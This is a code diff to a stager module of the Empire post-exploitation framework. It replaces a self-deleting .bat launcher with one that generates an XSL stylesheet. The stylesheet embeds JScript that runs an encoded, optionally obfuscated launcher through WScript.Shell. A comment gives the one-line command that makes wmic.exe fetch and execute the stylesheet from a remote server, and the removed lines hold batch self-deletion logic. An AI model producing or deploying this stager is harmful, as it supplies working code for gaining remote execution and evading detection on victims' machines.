@@ -5,14 +5,14 @@ class Stager:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'BAT Launcher',
+            'Name': 'wmic_xsl',
 
-            'Author': ['@harmj0y'],
+            'Author': ['@subTee','@mattifestation'],
 
-            'Description': ('Generates a self-deleting .bat launcher for Empire.'),
+            'Description': ('Generates an XSL stylesheets file to be run with wmic.exe'),
 
             'Comments': [
-                ''
+                'On the endpoint simply launch wmic os get /format:"http://server/launcher.xsl"'
             ]
         }
 
@@ -36,13 +36,13 @@ class Stager:
                 'Value'         :   '0'
             },
             'OutFile' : {
-                'Description'   :   'File to output .bat launcher to, otherwise displayed on the screen.',
+                'Description'   :   'File to output XSL to, otherwise displayed on the screen.',
                 'Required'      :   False,
-                'Value'         :   '/tmp/launcher.bat'
+                'Value'         :   '/tmp/launcher.xsl'
             },
-            'Delete' : {
-                'Description'   :   'Switch. Delete .bat after running.',
-                'Required'      :   False,
+            'Base64' : {
+                'Description'   :   'Switch. Base64 encode the output.',
+                'Required'      :   True,
                 'Value'         :   'True'
             },
             'Obfuscate' : {
@@ -75,7 +75,7 @@ class Stager:
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-        
+
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -88,7 +88,7 @@ class Stager:
         # extract all of our options
         language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
-        delete = self.options['Delete']['Value']
+        base64 = self.options['Base64']['Value']
         obfuscate = self.options['Obfuscate']['Value']
         obfuscateCommand = self.options['ObfuscateCommand']['Value']
         userAgent = self.options['UserAgent']['Value']
@@ -96,22 +96,27 @@ class Stager:
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
 
+        encode = False
+        if base64.lower() == "true":
+            encode = True
+
         obfuscateScript = False
         if obfuscate.lower() == "true":
             obfuscateScript = True
 
-        # generate the launcher code including escapes for % characters needed for .bat files
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries).replace("%", "%%")
+        # generate the launcher code
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=encode, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
         else:
-            code = "@echo off\n"
-            code += "start /b " + launcher + "\n"
-
-            if delete.lower() == "true":
-                # code that causes the .bat to delete itself
-                code += "start /b \"\" cmd /c del \"%%~f0\"&exit /b\n"
-
-            return code
+            code = "<?xml version=\"1.0\"?><stylesheet\n"
+            code += "xmlns=\"http://www.w3.org/1999/XSL/Transform\" xmlns:ms=\"urn:schemas-microsoft-com:xslt\"\n"
+            code += "xmlns:user=\"placeholder\"\n"
+            code += "version=\"1.0\">\n"
+            code += "<output method=\"text\"/><ms:script implements-prefix=\"user\" language=\"JScript\">"
+            code += "<![CDATA[var r = new ActiveXObject(\"WScript.Shell\").Run(\""
+            code += launcher
+            code += "\");]]></ms:script></stylesheet>"
+        return code
